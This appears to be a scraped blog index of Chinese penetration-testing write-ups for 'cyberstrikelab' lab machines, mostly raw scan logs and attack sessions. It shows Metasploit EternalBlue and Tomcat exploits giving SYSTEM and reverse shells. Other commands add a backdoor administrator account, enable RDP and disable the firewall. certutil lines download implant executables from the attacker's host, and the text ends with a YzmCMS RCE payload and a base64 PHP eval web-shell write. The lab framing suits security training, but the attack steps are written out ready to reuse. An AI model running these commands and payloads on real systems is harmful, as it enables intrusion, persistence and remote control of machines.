imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[532ms] 有效端口数量: 65535[599ms] [*] 端口开放 10.0.0.24:139[745ms] [*] 端口开放 10.0.0.24:135[783ms] [*] 端口开放 10.0.0.24:445[3.3s] [*] 端口开放 10.0.0.24:5985[22.4s] [*] 端口开放 10.0.0.24:47001[23.3s] [*] 端口开放 10.0.0.24:49152[23.3s] [*] 端口开放 10.0.0.24:49153[23.3s] [*] 端口开放 10.0.0.24:49154[23.3s] [*] 端口开放 10.0.0.24:49155[23.3s] [*] 端口开放 10.0.0.24:49156[23.3s] [*] 端口开放 10.0.0.24:49157[23.3s] [*] 端口开放 10.0.0.24:49158[23.3s] [*] 端口开放 10.0.0.24:49159[31.3s] 扫描完成, 发现 13 个开放端口[31.3s] 存活端口数量: 13[31.3s] 开始漏洞扫描[31.4s] [*] NetInfo 扫描结果目标主机: 10.0.0.24主机名: cyberweb发现的网络接口: IPv4地址: └─ 10.0.0.24[31.5s] [+] NetBios 10.0.0.24 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[34.5s] 扫描已完成: 6/6 扫出子域名，添加到hosts (base) Downloads fscan2 -h cyberweb.cyberstrikelab.com -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[663ms] 已选择服务扫描模式[663ms] 开始信息扫描[663ms] 最终有效主机数量: 1[663ms] 开始主机扫描[663ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[667ms] 有效端口数量: 65535[876ms] [*] 端口开放 cyberweb.cyberstrikelab.com:135[912ms] [*] 端口开放 cyberweb.cyberstrikelab.com:139[1.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:445[3.8s] [*] 端口开放 cyberweb.cyberstrikelab.com:5985[4.9s] [*] 端口开放 cyberweb.cyberstrikelab.com:8009[4.9s] [*] 端口开放 cyberweb.cyberstrikelab.com:8080[29.7s] [*] 端口开放 cyberweb.cyberstrikelab.com:47001[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49159[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49157[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49156[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49155[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49158[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49154[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49152[31.4s] [*] 端口开放 cyberweb.cyberstrikelab.com:49153[45.5s] 扫描完成, 发现 15 个开放端口[45.5s] 存活端口数量: 15[45.5s] 开始漏洞扫描[45.6s] POC加载完成: 总共387个，成功387个，失败0个[46.1s] [*] NetInfo 扫描结果目标主机: cyberweb.cyberstrikelab.com主机名: cyberweb发现的网络接口: IPv4地址: └─ 10.0.0.24[46.1s] [+] NetBios cyberweb.cyberstrikelab.com cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[47.3s] [*] 网站标题 http://cyberweb.cyberstrikelab.com:8080 状态码:200 长度:1554 标题:Welcome to JBoss AS[47.4s] [*] 发现指纹 目标: http://cyberweb.cyberstrikelab.com:8080 指纹: [Jboss] CVE-2017-12149扫出jboss","tags":["CVE-2017-12149"]},{"title":"cyberstrikelab pt-14","path":"/2025/07/21/pt-14/","content":"pt-14信息收集(base) Downloads fscan2 -h 10.0.0.26 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[536ms] 已选择服务扫描模式[536ms] 开始信息扫描[536ms] 最终有效主机数量: 1[536ms] 开始主机扫描[536ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[540ms] 有效端口数量: 65535[709ms] [*] 端口开放 10.0.0.26:135[770ms] [*] 端口开放 10.0.0.26:445[821ms] [*] 端口开放 10.0.0.26:139[3.4s] [*] 端口开放 10.0.0.26:5985[4.3s] [*] 端口开放 10.0.0.26:8009[4.4s] [*] 端口开放 10.0.0.26:8080[22.5s] [*] 端口开放 10.0.0.26:47001[23.8s] [*] 端口开放 10.0.0.26:49152[23.8s] [*] 端口开放 10.0.0.26:49153[23.8s] [*] 端口开放 10.0.0.26:49154[23.8s] [*] 端口开放 10.0.0.26:49155[23.8s] [*] 端口开放 10.0.0.26:49156[23.8s] [*] 端口开放 10.0.0.26:49157[23.8s] [*] 端口开放 10.0.0.26:49158[23.8s] [*] 端口开放 10.0.0.26:49159[31.3s] 扫描完成, 发现 15 个开放端口[31.3s] 存活端口数量: 15[31.3s] 开始漏洞扫描[31.3s] POC加载完成: 总共387个，成功387个，失败0个[31.5s] [*] NetInfo 扫描结果目标主机: 10.0.0.26主机名: cyberweb发现的网络接口: IPv4地址: └─ 10.0.0.26[31.5s] [+] NetBios 10.0.0.26 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[31.7s] [*] 网站标题 http://10.0.0.26:8080 状态码:200 长度:11432 标题:Apache Tomcat/8.5.19[41.1s] 扫描已完成: 10/10 hosts添加 10.0.0.26 cyberweb.cyberstrikelab.com CVE-2019-0232也没什么东西，是个tomcat，根据版本搜索RCE msf6 use exploit/multi/http/tomcat_jsp_upload_bypass[*] No payload configured, defaulting to generic/shell_reverse_tcpmsf6 exploit(multi/http/tomcat_jsp_upload_bypass) set RHOSTS 10.0.0.26RHOSTS = 10.0.0.26msf6 exploit(multi/http/tomcat_jsp_upload_bypass) run[*] Started reverse TCP handler on 172.16.233.2:4444[*] Uploading payload...[*] Payload executed![*] Command shell session 1 opened (172.16.233.2:4444 - 10.0.0.26:49168) at 2025-07-22 09:08:53 +0800Shell Banner:Microsoft Windows [_ 6.3.9600]-----C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5whoamiwhoamint authority etwork service certutil下载木马上线 certutil.exe -urlcache -split -f http://172.16.233.2:8889/beacon.exe beacon.exe juicypotato直接提权","tags":["CVE-2019-0232"]},{"title":"cyberstrikelab pt-13","path":"/2025/07/21/pt-13/","content":"pt-13信息收集(base) Downloads fscan2 -h 10.0.0.25 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[541ms] 已选择服务扫描模式[541ms] 开始信息扫描[541ms] 最终有效主机数量: 1[541ms] 开始主机扫描[541ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[545ms] 有效端口数量: 65535[650ms] [*] 端口开放 10.0.0.25:445[760ms] [*] 端口开放 10.0.0.25:135[790ms] [*] 端口开放 10.0.0.25:139[3.3s] [*] 端口开放 10.0.0.25:5985[22.1s] [*] 端口开放 10.0.0.25:47001[23.1s] [*] 端口开放 10.0.0.25:49152[23.1s] [*] 端口开放 10.0.0.25:49153[23.1s] [*] 端口开放 10.0.0.25:49154[23.1s] [*] 端口开放 10.0.0.25:49155[23.1s] [*] 端口开放 10.0.0.25:49157[23.1s] [*] 端口开放 10.0.0.25:49158[23.1s] [*] 端口开放 10.0.0.25:49156[23.1s] [*] 端口开放 10.0.0.25:49159[30.5s] 扫描完成, 发现 13 个开放端口[30.5s] 存活端口数量: 13[30.5s] 开始漏洞扫描[30.6s] [*] NetInfo 扫描结果目标主机: 10.0.0.25主机名: cyberweb发现的网络接口: IPv4地址: └─ 10.0.0.25[30.6s] [+] NetBios 10.0.0.25 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[33.9s] 扫描已完成: 6/6 /etc/hosts添加 10.0.0.25 cyberweb.cyberstrikelab.com (base) Downloads fscan2 -h cyberweb.cyberstrikelab.com -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[542ms] 已选择服务扫描模式[542ms] 开始信息扫描[542ms] 最终有效主机数量: 1[542ms] 开始主机扫描[542ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[545ms] 有效端口数量: 65535[837ms] [*] 端口开放 cyberweb.cyberstrikelab.com:139[837ms] [*] 端口开放 cyberweb.cyberstrikelab.com:135[979ms] [*] 端口开放 cyberweb.cyberstrikelab.com:445[3.6s] [*] 端口开放 cyberweb.cyberstrikelab.com:5985[4.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:7001[23.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:47001[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49152[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49153[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49155[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49154[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49157[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49156[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49159[24.1s] [*] 端口开放 cyberweb.cyberstrikelab.com:49158[31.8s] 扫描完成, 发现 14 个开放端口[31.8s] 存活端口数量: 14[31.8s] 开始漏洞扫描[31.9s] POC加载完成: 总共387个，成功387个，失败0个[31.9s] [*] NetInfo 扫描结果目标主机: cyberweb.cyberstrikelab.com主机名: cyberweb发现的网络接口: IPv4地址: └─ 10.0.0.25[32.0s] [+] NetBios cyberweb.cyberstrikelab.com cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[33.6s] [*] 网站标题 http://cyberweb.cyberstrikelab.com:7001 状态码:404 长度:1164 标题:Error 404--Not Found[33.6s] [*] 发现指纹 目标: http://cyberweb.cyberstrikelab.com:7001 指纹: [weblogic] 发现weblogic CVE-2020-2551","tags":["CVE-2020-2551"]},{"title":"cyberstrikelab pt-11","path":"/2025/07/21/pt-11/","content":"pt-11信息收集(base) Downloads fscan2 -h 10.0.0.23 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[580ms] 已选择服务扫描模式[580ms] 开始信息扫描[581ms] 最终有效主机数量: 1[581ms] 开始主机扫描[581ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[584ms] 有效端口数量: 65535[692ms] [*] 端口开放 10.0.0.23:135[700ms] [*] 端口开放 10.0.0.23:139[874ms] [*] 端口开放 10.0.0.23:445[3.5s] [*] 端口开放 10.0.0.23:5985[4.4s] [*] 端口开放 10.0.0.23:7848[4.8s] [*] 端口开放 10.0.0.23:8848[5.3s] [*] 端口开放 10.0.0.23:9848[5.3s] [*] 端口开放 10.0.0.23:9849[23.1s] [*] 端口开放 10.0.0.23:47001[24.3s] [*] 端口开放 10.0.0.23:49664[24.3s] [*] 端口开放 10.0.0.23:49665[24.3s] [*] 端口开放 10.0.0.23:49666[24.3s] [*] 端口开放 10.0.0.23:49667[24.3s] [*] 端口开放 10.0.0.23:49668[24.3s] [*] 端口开放 10.0.0.23:49670[24.3s] [*] 端口开放 10.0.0.23:49669[32.1s] 扫描完成, 发现 16 个开放端口[32.1s] 存活端口数量: 16[32.1s] 开始漏洞扫描[32.2s] POC加载完成: 总共387个，成功387个，失败0个[32.4s] [*] NetInfo 扫描结果目标主机: 10.0.0.23主机名: WIN-5V991SP6TBO发现的网络接口: IPv4地址: └─ 10.0.0.23[33.3s] [*] 网站标题 http://10.0.0.23:8848 状态码:404 长度:431 标题:HTTP Status 404 – Not Found[42.0s] 扫描已完成: 8/8 nacos-rce因为8848默认是nacos，访问http://10.0.0.23:8848/nacos，未开启鉴权且未v2.3.2 服务端开启https://github.com/WingBy-Fkalis/Nacos_Rce (base) Nacos_Rce [main●●] python3 service.pyFound existing alias for python3. You should use: p * Serving Flask app service * Debug mode: offWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:5001 * Running on http://172.16.233.2:5001Press CTRL+C to quit10.0.0.23 - - [25/Jul/2025 20:45:23] GET /download HTTP/1.1 200 - 撞半天又不行了，换了个工具","tags":["nacos"]},{"title":"cyberstrikelab pt-8","path":"/2025/07/21/pt-8/","content":"pt-8信息收集(base) Downloads fscan2 -h 10.0.0.17 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[560ms] 已选择服务扫描模式[560ms] 开始信息扫描[560ms] 最终有效主机数量: 1[560ms] 开始主机扫描[560ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[564ms] 有效端口数量: 65535[642ms] [*] 端口开放 10.0.0.17:135[646ms] [*] 端口开放 10.0.0.17:139[815ms] [*] 端口开放 10.0.0.17:445[3.2s] [*] 端口开放 10.0.0.17:5357[23.4s] [*] 端口开放 10.0.0.17:49152[23.4s] [*] 端口开放 10.0.0.17:49153[23.4s] [*] 端口开放 10.0.0.17:49154[23.4s] [*] 端口开放 10.0.0.17:49155[23.4s] [*] 端口开放 10.0.0.17:49156[23.4s] [*] 端口开放 10.0.0.17:49157[30.8s] 扫描完成, 发现 10 个开放端口[30.8s] 存活端口数量: 10[30.8s] 开始漏洞扫描[30.9s] [*] NetInfo 扫描结果目标主机: 10.0.0.17主机名: cslab-PC发现的网络接口: IPv4地址: └─ 10.0.0.17[31.0s] [+] 发现漏洞 10.0.0.17 [Windows 7 Professional 7600] MS17-010[33.8s] 扫描已完成: 6/6 ms17-010msf6 exploit(windows/smb/ms17_010_psexec) use exploit/windows/smb/ms17_010_eternalblue[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_eternalblue) set payload windows/x64/meterpreter/bind_tcp_uuidpayload = windows/x64/meterpreter/bind_tcp_uuidmsf6 exploit(windows/smb/ms17_010_eternalblue) set RHOSTS 10.0.0.17RHOSTS = 10.0.0.17msf6 exploit(windows/smb/ms17_010_eternalblue) run[*] 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)[*] 10.0.0.17:445 - Scanned 1 of 1 hosts (100% complete)[+] 10.0.0.17:445 - The target is vulnerable.[*] 10.0.0.17:445 - Connecting to target for exploitation.[+] 10.0.0.17:445 - Connection established for exploitation.[+] 10.0.0.17:445 - Target OS selected valid for OS indicated by SMB reply[*] 10.0.0.17:445 - CORE raw buffer dump (27 bytes)[*] 10.0.0.17:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes[*] 10.0.0.17:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 30 sional 7600[+] 10.0.0.17:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 10.0.0.17:445 - Trying exploit with 12 Groom Allocations.[*] 10.0.0.17:445 - Sending all but last fragment of exploit packet[*] 10.0.0.17:445 - Starting non-paged pool grooming[+] 10.0.0.17:445 - Sending SMBv2 buffers[+] 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 10.0.0.17:445 - Sending final SMBv2 buffers.[*] 10.0.0.17:445 - Sending last fragment of exploit packet![*] 10.0.0.17:445 - Receiving response from exploit packet[+] 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 10.0.0.17:445 - Sending egg to corrupted connection.[*] 10.0.0.17:445 - Triggering free of corrupted buffer.[*] Started bind TCP handler against 10.0.0.17:4444[*] Sending stage (203846 bytes) to 10.0.0.17[*] Meterpreter session 1 opened (172.16.233.2:65092 - 10.0.0.17:4444) at 2025-07-21 09:38:49 +0800[+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=meterpreter shellProcess 1756 created.Channel 1 created.Microsoft Windows [�汾 6.1.7600]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��C:\\Windows\\system32whoamiwhoamint authority\\system 获得system权限","tags":["MS17-010"]},{"title":"cyberstrikelab pt-7","path":"/2025/07/21/pt-7/","content":"pt-7信息收集(base) Downloads fscan2 -h 10.0.0.15 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[539ms] 已选择服务扫描模式[539ms] 开始信息扫描[539ms] 最终有效主机数量: 1[539ms] 开始主机扫描[539ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[543ms] 有效端口数量: 65535[606ms] [*] 端口开放 10.0.0.15:445[621ms] [*] 端口开放 10.0.0.15:464[646ms] [*] 端口开放 10.0.0.15:135[653ms] [*] 端口开放 10.0.0.15:139[738ms] [*] 端口开放 10.0.0.15:444[765ms] [*] 端口开放 10.0.0.15:25[775ms] [*] 端口开放 10.0.0.15:389[776ms] [*] 端口开放 10.0.0.15:80[778ms] [*] 端口开放 10.0.0.15:81[800ms] [*] 端口开放 10.0.0.15:88[815ms] [*] 端口开放 10.0.0.15:443[848ms] [*] 端口开放 10.0.0.15:593[850ms] [*] 端口开放 10.0.0.15:587[3.7s] [*] 端口开放 10.0.0.15:717[3.7s] [*] 端口开放 10.0.0.15:808[3.7s] [*] 端口开放 10.0.0.15:636[3.8s] [*] 端口开放 10.0.0.15:890[6.9s] [*] 端口开放 10.0.0.15:1801[9.7s] [*] 端口开放 10.0.0.15:2103[9.7s] [*] 端口开放 10.0.0.15:2105[9.7s] [*] 端口开放 10.0.0.15:2107[15.7s] [*] 端口开放 10.0.0.15:3268[15.7s] [*] 端口开放 10.0.0.15:3269[24.7s] [*] 端口开放 10.0.0.15:5062[26.7s] [*] 端口开放 10.0.0.15:5060[27.9s] [*] 端口开放 10.0.0.15:6001[30.8s] [*] 端口开放 10.0.0.15:6493[30.8s] [*] 端口开放 10.0.0.15:6495[30.8s] [*] 端口开放 10.0.0.15:6402[30.8s] [*] 端口开放 10.0.0.15:6403[30.8s] [*] 端口开放 10.0.0.15:6405[30.8s] [*] 端口开放 10.0.0.15:6428[30.8s] [*] 端口开放 10.0.0.15:6504[30.8s] [*] 端口开放 10.0.0.15:6505[30.8s] [*] 端口开放 10.0.0.15:6415[30.8s] [*] 端口开放 10.0.0.15:6507[30.8s] [*] 端口开放 10.0.0.15:6468[30.8s] [*] 端口开放 10.0.0.15:6407[30.8s] [*] 端口开放 10.0.0.15:6546[30.8s] [*] 端口开放 10.0.0.15:6511[30.8s] [*] 端口开放 10.0.0.15:6530[30.8s] [*] 端口开放 10.0.0.15:6513[30.8s] [*] 端口开放 10.0.0.15:6515[30.8s] [*] 端口开放 10.0.0.15:6534[30.8s] [*] 端口开放 10.0.0.15:6406[30.8s] [*] 端口开放 10.0.0.15:6557[30.9s] [*] 端口开放 10.0.0.15:6400[30.9s] [*] 端口开放 10.0.0.15:6455[30.9s] [*] 端口开放 10.0.0.15:6410[30.9s] [*] 端口开放 10.0.0.15:6401[30.9s] [*] 端口开放 10.0.0.15:6581[30.9s] [*] 端口开放 10.0.0.15:6585[30.9s] [*] 端口开放 10.0.0.15:6603[30.9s] [*] 端口开放 10.0.0.15:6614[39.8s] [*] 端口开放 10.0.0.15:8172[45.8s] [*] 端口开放 10.0.0.15:9389[48.7s] [*] 端口开放 10.0.0.15:9710[5m21s] [*] 端口开放 10.0.0.15:64327[5m21s] [*] 端口开放 10.0.0.15:64337[5m30s] 扫描完成, 发现 59 个开放端口[5m30s] 存活端口数量: 59[5m30s] 开始漏洞扫描[5m30s] POC加载完成: 总共387个，成功387个，失败0个[5m30s] [*] NetInfo 扫描结果目标主机: 10.0.0.15主机名: WIN-3UO9KLE0PIS发现的网络接口: IPv4地址: └─ 10.0.0.15[5m30s] [+] 发现漏洞 10.0.0.15 [Windows Server 2016 Standard 14393] MS17-010[5m30s] [+] SMTP服务 10.0.0.15:25 允许匿名访问[5m31s] [*] 网站标题 http://10.0.0.15:81 状态码:403 长度:1157 标题:403 - 禁止访问: 访问被拒绝。[5m31s] [*] 网站标题 http://10.0.0.15 状态码:403 长度:0 标题:无标题[5m31s] [*] 网站标题 https://10.0.0.15 状态码:500 长度:3367 标题:运行时错误[5m35s] [*] 网站标题 https://10.0.0.15:8172 状态码:404 长度:0 标题:无标题 发现MS17-010 MS17-010msf6 exploit(windows/smb/ms17_010_eternalblue) use auxiliary/admin/smb/ms17_010_commandmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND whoamiCOMMAND = whoamimsf6 auxiliary(admin/smb/ms17_010_command) set RHOSTS 10.0.0.15RHOSTS = 10.0.0.15msf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for whoami:nt authority\\system[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 发现是system权限，直接远程桌面上去 msf6 auxiliary(admin/smb/ms17_010_command) set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fCOMMAND = REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f:����ɹ���ɡ�[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND net user cc Admin@123 /addCOMMAND = net user cc Admin@123 /addmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for net user cc Admin@123 /add:����ɹ���ɡ�[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND net localgroup Administrators cc /addCOMMAND = net localgroup Administrators cc /addmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for net localgroup Administrators cc /add:����ɹ���ɡ�[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND netsh firewall set opmode disableCOMMAND = netsh firewall set opmode disablemsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for netsh firewall set opmode disable:��Ҫ��Ϣ: �ѳɹ�ִ����������޳�ʹ�� netsh firewall����Ӧ��ʹ�� netsh advfirewall firewall���й�ʹ�� netsh advfirewall firewall ������� netsh firewall ����ϸ��Ϣ�������http://go.microsoft.com/fwlink/?linkid=121488�ϵ� KB ���� 947709��ȷ����[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed","tags":["MS17-010"]},{"title":"cyberstrikelab pt-2","path":"/2025/07/18/pt-2/","content":"pt-2信息收集192.168.1.233:22 open192.168.1.11:80 open192.168.1.11:135 open192.168.1.11:139 open192.168.1.11:445 open192.168.1.11:3306 open192.168.1.233:8080 open 发现首页是CMS YzmCMS远程代码执行 执行命令 out_trade_no[0]=eqout_trade_no[1]=whoamiout_trade_no[2]=system 发现360，上传会失败,用certutil certutil.exe -urlcache -split -f http://172.16.233.2:8883/fenli.exe C:/WWW/fenli.execertutil.exe -urlcache -split -f http://172.16.233.2:8883/360.ini C:/WWW/360.ini juicypotato提权 86b77ea99f51f8cc5006a96a7d75df01","tags":["juicypotato提权","YzmCMS"]},{"title":"cyberstrikelab pt-3","path":"/2025/07/18/pt-3/","content":"pt-3eyoucms这里直接弱口令 cyberstrikelab/123456 进后台 ?=file_put_contents(./uploads/ass.php,base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==)); 